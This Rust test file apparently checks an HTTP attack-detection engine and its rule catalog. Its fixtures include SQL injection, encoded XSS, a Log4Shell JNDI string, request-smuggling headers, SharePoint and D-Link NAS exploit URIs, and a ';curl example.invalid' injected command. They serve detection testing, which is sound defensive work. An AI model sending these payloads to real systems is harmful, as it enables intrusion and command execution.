use http_detection_agent::{
    aggregate::{self, Aggregator},
    catalog::{Catalog, Condition, Profile, Transform},
    engine::{Engine, Matcher, transform},
    input::Reader,
    scan::{self, Config},
};
use serde_json::{Value, json};
use std::{borrow::Cow, collections::BTreeSet, io::Write, path::Path};

fn catalog() -> Catalog {
    Catalog::load(&Path::new(env!("CARGO_MANIFEST_DIR")).join("rules/http-attacks.json")).unwrap()
}
fn engine() -> Engine {
    Engine::compile(catalog()).unwrap()
}
fn hits(e: &Engine, value: Value) -> BTreeSet<String> {
    let mut bytes = serde_json::to_vec(&value).unwrap();
    let tape = simd_json::to_tape(&mut bytes).unwrap();
    let mut event = e.event(tape.as_value()).unwrap();
    e.events
        .iter()
        .filter(|(_, expr)| e.evaluate(expr, &mut event))
        .map(|(id, _)| e.catalog.rules[*id].id.clone())
        .collect()
}

#[test]
fn catalog_and_profile_compile_without_coverage_loss() {
    let full = engine();
    assert_eq!(
        full.events.len() + full.aggregates.len(),
        full.catalog.rules.len()
    );
    let profile: Profile = serde_json::from_slice(
        &std::fs::read(
            Path::new(env!("CARGO_MANIFEST_DIR")).join("profiles/cloudflare-log-explorer.json"),
        )
        .unwrap(),
    )
    .unwrap();
    let mut c = catalog();
    let excluded = c.select("all", false, Some(&profile));
    assert_eq!(c.rules.len(), 43);
    assert!(excluded.iter().any(|e| e.id == "http.sqli.request-body"));
    Engine::compile(c).unwrap();
}

#[test]
fn saved_attack_regressions() {
    let e = engine();
    let fixtures = [
        (
            json!({"ClientRequestURI":"/search?q=1%2520UNION%2520SELECT%2520password"}),
            "http.sqli.generic",
        ),
        (
            json!({"clientrequesturi":"/?q=%253Cscript%253Ealert(1)%253C/script%253E"}),
            "http.xss.generic",
        ),
        (
            json!({"requestheaders":{"X-Api-Version":"${jndi:ldap://example.invalid/a}"}}),
            "http.exploit.log4shell",
        ),
        (
            json!({"requestheaders":{"Content-Length":"4","Transfer-Encoding":"chunked"}}),
            "http.protocol.request-smuggling",
        ),
        (
            json!({"clientrequestmethod":"POST","clientrequesturi":"/_layouts/15/ToolPane.aspx?DisplayMode=Edit&a=%2FToolPane.aspx","clientrequestreferer":"https://sharepoint.example/_layouts/15/signout.aspx"}),
            "http.exploit.sharepoint-toolpane",
        ),
        (
            json!({"clientrequestmethod":"GET","clientrequestpath":"/","edgeresponsestatus":302,"requestheaders":{"Authorization":"Basic Zm9vOmJhcg=="},"responseheaders":{"Location":"/cpsess1234567890/"}}),
            "http.exploit.cpanel-crlf-auth-bypass",
        ),
        (
            json!({"requestbody":"1 UNION SELECT password"}),
            "http.sqli.request-body",
        ),
        (
            json!({"requestheadersraw":["Content-Length: 1","content-length: 2"]}),
            "http.protocol.duplicate-raw-header",
        ),
        (
            json!({"responsebody":"Fatal error: test failure"}),
            "http.response.information-leakage",
        ),
    ];
    for (event, expected) in fixtures {
        assert!(
            hits(&e, event.clone()).contains(expected),
            "missing {expected}: {event}"
        );
    }
    assert!(hits(&e, json!({"clientrequestmethod":"GET","clientrequesturi":"/products?page=2","clientrequestpath":"/products","clientrequestuseragent":"Mozilla/5.0","edgeresponsestatus":200,"requestheaders":{"Accept":"text/html"}})).is_empty());
    assert!(hits(&e, json!({})).is_empty());
}

#[test]
fn raw_header_tuning_preserves_framing_signals() {
    let e = engine();
    let id = "http.protocol.duplicate-raw-header";
    for headers in [
        json!(["Accept-Encoding: gzip", "accept-encoding: deflate"]),
        json!(["Connection: keep-alive", "CONNECTION: upgrade"]),
        json!(["Set-Cookie: a=1", "set-cookie: b=2"]),
    ] {
        assert!(!hits(&e, json!({"requestheadersraw":headers})).contains(id));
    }
    for name in ["Host", "Content-Length", "Transfer-Encoding"] {
        assert!(hits(&e, json!({"requestheadersraw":[format!("{name}: a"), format!("{}: b", name.to_lowercase()), "Accept-Encoding: gzip", "Accept-Encoding: deflate"]})).contains(id));
    }
}

#[test]
fn observed_overlay_contains_only_the_exploit_conjunction() {
    let e = Engine::compile(
        Catalog::load(&Path::new(env!("CARGO_MANIFEST_DIR")).join("rules/ibn-observed.json"))
            .unwrap(),
    )
    .unwrap();
    let rule = "http.exploit.dlink-nas-system-command";
    assert!(hits(&e, json!({"clientrequesturi":"/cgi-bin/nas_sharing.cgi?user=messagebus&cmd=15&system=aWQ="})).contains(rule));
    assert!(hits(&e, json!({"clientrequesturi":"/cgi-bin/nas_sharing.cgi?system=aWQ%3D&cmd=15&user=messagebus"})).contains(rule));
    for uri in [
        "/cgi-bin/nas_sharing.cgi",
        "/cgi-bin/nas_sharing.cgi?user=admin&cmd=15&system=aWQ=",
        "/cgi-bin/nas_sharing.cgi?user=messagebus&cmd=14&system=aWQ=",
        "/cgi-bin/nas_sharing.cgi?user=messagebus&cmd=15&system=",
        "/different?user=messagebus&cmd=15&system=aWQ=",
    ] {
        assert!(!hits(&e, json!({"clientrequesturi":uri})).contains(rule));
    }
    assert_eq!(e.catalog.rules.len(), 1);
    assert_eq!(e.catalog.rules[0].status, "test");
    assert!(
        hits(
            &e,
            json!({"clientrequestuseragent":"https://gdnplus.com:Gather Analyze Provide."})
        )
        .is_empty()
    );
    assert!(
        hits(
            &e,
            json!({"clientrequestuseragent":"Expanse, a Palo Alto Networks company"})
        )
        .is_empty()
    );
    assert!(hits(&e, json!({"clientrequestuseragent":"Mozilla/5.0"})).is_empty());
}

#[test]
fn normalization_contract() {
    assert_eq!(
        transform(Cow::Borrowed("a+b%2520c"), &[Transform::UrlDecode1]),
        "a+b%20c"
    );
    assert_eq!(
        transform(Cow::Borrowed("a+b%2520c"), &[Transform::UrlDecode2]),
        "a+b c"
    );
    assert_eq!(
        transform(Cow::Borrowed("%25253c"), &[Transform::UrlDecode2]),
        "%3c"
    );
    assert_eq!(
        transform(
            Cow::Borrowed("&lt;script&gt;"),
            &[Transform::HtmlEntityDecode]
        ),
        "<script>"
    );
    assert_eq!(
        transform(
            Cow::Borrowed("https://host.invalid/a;b?q=1#f"),
            &[Transform::PathOnly]
        ),
        "/a;b"
    );
    assert_eq!(
        transform(Cow::Borrowed("//host.invalid?q=1"), &[Transform::PathOnly]),
        ""
    );
    assert_eq!(
        transform(Cow::Borrowed("%FF+%zz"), &[Transform::UrlDecode1]),
        "�+%zz"
    );
}

fn custom(condition: Value) -> Engine {
    let mut c = catalog();
    let mut rule = c.rules.remove(0);
    rule.condition = Some(serde_json::from_value::<Condition>(condition).unwrap());
    rule.aggregate = None;
    c.rules = vec![rule];
    Engine::compile(c).unwrap()
}

#[test]
fn predicate_types_null_flags_and_short_circuit() {
    for (condition, positive, negative) in [
        (
            json!({"field":"x","op":"not_in","values":["allow"]}),
            json!({"x":"block"}),
            json!({}),
        ),
        (
            json!({"field":"x","op":"in","values":[200]}),
            json!({"x":200}),
            json!({"x":"200"}),
        ),
        (
            json!({"field":"x","op":"regex","value":"^abc$","flags":["i","m"]}),
            json!({"x":"x\nABC\nz"}),
            json!({"x":null}),
        ),
        (
            json!({"field":"x","op":"regex","value":"a.b","flags":["s"]}),
            json!({"x":"a\nb"}),
            json!({"x":"ab"}),
        ),
        (
            json!({"field":"x","op":"array_contains_any","values":["BLOCK"],"flags":["i"]}),
            json!({"x":["block"]}),
            json!({"x":"block"}),
        ),
        (
            json!({"field":"x","op":"map_key_exists","key":"Content-Length"}),
            json!({"x":{"CONTENT-LENGTH":null}}),
            json!({"x":null}),
        ),
        (
            json!({"field":"x","op":"gte","value":4}),
            json!({"x":"5"}),
            json!({"x":"NaN"}),
        ),
        (
            json!({"all":[{"field":"x","op":"is_null"},{"not":{"field":"y","op":"exists"}}]}),
            json!({}),
            json!({"y":""}),
        ),
    ] {
        let e = custom(condition);
        assert_eq!(hits(&e, positive).len(), 1);
        assert!(hits(&e, negative).is_empty());
    }
}

#[test]
fn all_aggregate_rules_and_exact_expiration() {
    let e = engine();
    let mut agg = Aggregator::new(&e.aggregates, 10_000, 1000);
    let mut found = BTreeSet::new();
    for n in 0..400 {
        let event = json!({"clientip":"192.0.2.1","clientrequestpath":format!("/admin/{n}"),"clientrequesturi":"/.env","edgeresponsestatus":404});
        let mut bytes = serde_json::to_vec(&event).unwrap();
        let tape = simd_json::to_tape(&mut bytes).unwrap();
        let mut ev = e.event(tape.as_value()).unwrap();
        let contributions = aggregate::prepare(&e, &mut ev, 4096).unwrap();
        for hit in agg.push(n * 1_000_000, contributions).unwrap() {
            found.insert(e.catalog.rules[hit.rule].id.clone());
        }
    }
    assert!(found.contains("http.recon.path-enumeration"));
    assert!(found.contains("http.recon.sensitive-path-sweep"));
    assert!(found.contains("http.dos.request-burst"));
    for n in 0..30 {
        let mut bytes = serde_json::to_vec(&json!({"clientip":format!("192.0.2.{}", n % 10),"clientrequestpath":"/login","clientrequesturi":"/.env","edgeresponsestatus":401})).unwrap();
        let tape = simd_json::to_tape(&mut bytes).unwrap();
        let mut ev = e.event(tape.as_value()).unwrap();
        for hit in agg
            .push(
                1_000_000_000 + n * 1_000_000,
                aggregate::prepare(&e, &mut ev, 4096).unwrap(),
            )
            .unwrap()
        {
            found.insert(e.catalog.rules[hit.rule].id.clone());
        }
    }
    assert!(found.contains("http.attack.distributed-payload-campaign"));
    let mut c = catalog();
    c.rules
        .retain(|r| r.id == "http.authentication.failed-login-burst");
    let e = Engine::compile(c).unwrap();
    let mut agg = Aggregator::new(&e.aggregates, 1000, 10);
    let mut alerts = 0;
    for n in 0..41 {
        let ts = if n < 21 { 0 } else { 300_000_000_000 };
        let mut bytes = serde_json::to_vec(
            &json!({"clientip":"192.0.2.1","clientrequestpath":"/login","edgeresponsestatus":401}),
        )
        .unwrap();
        let tape = simd_json::to_tape(&mut bytes).unwrap();
        let mut ev = e.event(tape.as_value()).unwrap();
        alerts += agg
            .push(ts, aggregate::prepare(&e, &mut ev, 4096).unwrap())
            .unwrap()
            .len();
    }
    assert_eq!(
        alerts, 2,
        "alert once per threshold crossing; expire at exact window boundary"
    );
}

#[test]
fn steady_rate_does_not_realert_during_expire_insert_transition() {
    let mut c = catalog();
    c.rules.retain(|r| r.id == "http.dos.request-burst");
    let e = Engine::compile(c).unwrap();
    let mut agg = Aggregator::new(&e.aggregates, 1000, 10);
    let mut alerts = 0;
    for n in 0..1000 {
        let mut bytes = br#"{"clientip":"192.0.2.1"}"#.to_vec();
        let tape = simd_json::to_tape(&mut bytes).unwrap();
        let mut event = e.event(tape.as_value()).unwrap();
        alerts += agg
            .push(
                n * 200_000_000,
                aggregate::prepare(&e, &mut event, 4096).unwrap(),
            )
            .unwrap()
            .len();
    }
    assert_eq!(alerts, 1);
}

fn config(path: &Path) -> Config {
    Config {
        inputs: vec![path.to_owned()],
        threads: 2,
        batch_bytes: 113,
        max_line_bytes: 4096,
        max_key_bytes: 4096,
        max_window_entries: 10000,
        max_state_bytes: 64 << 20,
        max_groups: 1000,
        max_pending: 1000,
        lateness_ns: 0,
        drop_late: false,
        skip_invalid: false,
        timestamp_multiplier: 1_000_000_000,
        counts_only: true,
        quiet: true,
    }
}

#[test]
fn streaming_boundaries_compression_and_failure_policies() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("logs.ndjson");
    let source = b"\n{\"clientrequesturi\":\"/.env\"}\r\n{\"clientrequesturi\":\"/?x=@@version\"}";
    std::fs::write(&path, source).unwrap();
    let mut reader = Reader::new(&path, 17, 4096).unwrap();
    let mut read = vec![];
    while let Some(batch) = reader.next_batch().unwrap() {
        read.extend(batch.data);
    }
    assert_eq!(read, source);
    let mut c = catalog();
    c.select("all", true, None);
    let e = Engine::compile(c).unwrap();
    let cfg = config(&path);
    let s = scan::run(&e, &cfg, vec![], &mut std::io::sink());
    assert!(s.complete, "{:?}", s.error);
    assert_eq!(s.records, 2);
    assert_eq!(s.blank_lines, 1);
    assert_eq!(s.bytes, source.len() as u64);
    let mut gz = flate2::write::GzEncoder::new(vec![], flate2::Compression::fast());
    gz.write_all(source).unwrap();
    let gz = gz.finish().unwrap();
    for (name, bytes) in [
        ("gzip", gz),
        ("zstd", zstd::stream::encode_all(&source[..], 1).unwrap()),
    ] {
        let path = dir.path().join(name);
        std::fs::write(&path, bytes).unwrap();
        let s = scan::run(&e, &config(&path), vec![], &mut std::io::sink());
        assert!(s.complete, "{:?}", s.error);
        assert_eq!(s.records, 2);
    }
    std::fs::write(&path, b"{}\nbroken\n{}\n").unwrap();
    let s = scan::run(&e, &cfg, vec![], &mut std::io::sink());
    assert!(!s.complete);
    let mut cfg = cfg;
    cfg.skip_invalid = true;
    let s = scan::run(&e, &cfg, vec![], &mut std::io::sink());
    assert!(s.complete);
    assert_eq!(s.invalid_records, 1);
    assert_eq!(s.records, 2);
    cfg.max_line_bytes = 2;
    std::fs::write(&path, b"{\"x\":1}\n").unwrap();
    let s = scan::run(&e, &cfg, vec![], &mut std::io::sink());
    assert!(!s.complete, "oversize must fail even with skip-invalid");
}

#[test]
fn lateness_ordering_and_capacity_are_explicit() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("events");
    let mut f = std::fs::File::create(&path).unwrap();
    for ts in [100, 102, 101] {
        writeln!(f, "{}", json!({"edgeendtimestamp":ts,"clientip":"192.0.2.1","clientrequesturi":"/.env","clientrequestpath":"/.env"})).unwrap();
    }
    let e = engine();
    let mut cfg = config(&path);
    let s = scan::run(&e, &cfg, vec![], &mut std::io::sink());
    assert!(!s.complete);
    cfg.lateness_ns = 2_000_000_000;
    let s = scan::run(&e, &cfg, vec![], &mut std::io::sink());
    assert!(s.complete, "{:?}", s.error);
    assert_eq!(s.late_events, 0);
    cfg.lateness_ns = 0;
    cfg.drop_late = true;
    let s = scan::run(&e, &cfg, vec![], &mut std::io::sink());
    assert!(s.complete);
    assert_eq!(s.late_events, 1);
    assert!(s.event_findings >= 3);
    cfg.lateness_ns = 2_000_000_000;
    cfg.max_pending = 1;
    let s = scan::run(&e, &cfg, vec![], &mut std::io::sink());
    assert!(!s.complete);
    cfg.max_pending = 100;
    cfg.max_window_entries = 1;
    let s = scan::run(&e, &cfg, vec![], &mut std::io::sink());
    assert!(!s.complete);
}

#[test]
fn findings_always_retain_attribution_and_location() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("events");
    std::fs::write(&path, b"{\"clientrequesturi\":\"/?x=@@version\"}\n").unwrap();
    let mut c = catalog();
    c.select("all", true, None);
    let e = Engine::compile(c).unwrap();
    let mut cfg = config(&path);
    cfg.counts_only = false;
    let mut out = vec![];
    let s = scan::run(&e, &cfg, vec![], &mut out);
    assert!(s.complete);
    let line: Value = serde_json::from_slice(out.split(|b| *b == b'\n').next().unwrap()).unwrap();
    assert_eq!(line["rule_id"], "http.sqli.generic");
    assert_eq!(line["details"]["line"], 1);
    assert_eq!(line["details"]["byte_offset"], 0);
    assert!(
        line["provenance"]
            .as_array()
            .unwrap()
            .iter()
            .any(|p| p["source"] == "sigma" && !p["authors"].as_array().unwrap().is_empty())
    );
    assert!(!line["sources"].as_array().unwrap().is_empty());
}

#[test]
fn plain_and_grouped_have_identical_attributed_findings() {
    let dir = tempfile::tempdir().unwrap();
    let path = dir.path().join("matcher-input");
    let mut f = std::fs::File::create(&path).unwrap();
    for uri in [
        "/products?page=2",
        "/?x=@@version",
        "/.env",
        "/?x=commonscollections",
        "/?x=commonscollectionſ",
        "/?x=__proto__",
        "/?x=rO0AB",
        "/?x=php://input",
        "/?x=%253Cscript%253E",
        "/?x=&#60script&#62",
        "/?x=;curl example.invalid",
    ] {
        writeln!(
            f,
            "{}",
            json!({"clientrequesturi":uri,"clientrequestuseragent":"sqlmap","requestbody":uri})
        )
        .unwrap();
    }
    for event in [
        json!({"requestheaders":{"X-Test":"${jndi:ldap://example.invalid/a}"}}),
        json!({"requestheaders":{"Content-Length":"4","Transfer-Encoding":"chunked"}}),
        json!({"requestheadersraw":["Host: one.example","host: two.example"]}),
        json!({"clientrequesturi":null,"requestbody":null}),
        json!({}),
    ] {
        writeln!(f, "{event}").unwrap();
    }
    let mut c = catalog();
    c.select("all", true, None);
    let mut cfg = config(&path);
    cfg.batch_bytes = 4096;
    cfg.counts_only = false;
    let mut reference = None;
    for matcher in [Matcher::Plain, Matcher::Grouped] {
        let e = Engine::compile_with_matcher(c.clone(), matcher).unwrap();
        let mut output = vec![];
        let s = scan::run(&e, &cfg, vec![], &mut output);
        assert!(s.complete, "{:?}", s.error);
        assert_eq!(s.matcher, matcher);
        let result = (output, s.match_digest_sha256, s.rule_counts);
        if let Some(expected) = &reference {
            assert_eq!(expected, &result);
        } else {
            reference = Some(result);
        }
    }
}
